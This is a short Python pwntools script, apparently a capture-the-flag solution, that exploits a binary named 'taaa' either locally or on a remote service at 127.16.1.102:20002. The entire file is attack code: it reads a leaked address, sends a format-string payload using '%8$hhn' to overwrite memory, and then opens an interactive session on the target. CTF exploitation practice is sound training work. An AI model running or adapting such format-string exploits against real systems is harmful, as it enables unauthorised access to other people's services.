from pwn import *
from time import *
debug = True
local = True
x86 = False
if debug:
	context.log_level = 'debug'
else:
	context.log_level = 'info'
if x86:
	libc = ELF('/lib32/libc.so.6')
else:
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if local:
	p = process('./taaa')
else:
	p = remote('127.16.1.102',20002)

payload = 'a'*0x55 + "%8$hhn"
address = int(p.recvuntil("\n").strip(),16)
p.recvuntil("string\n")
p.sendline(payload)
p.recvuntil("integer\n")
p.sendline(str(address))
p.interactive()
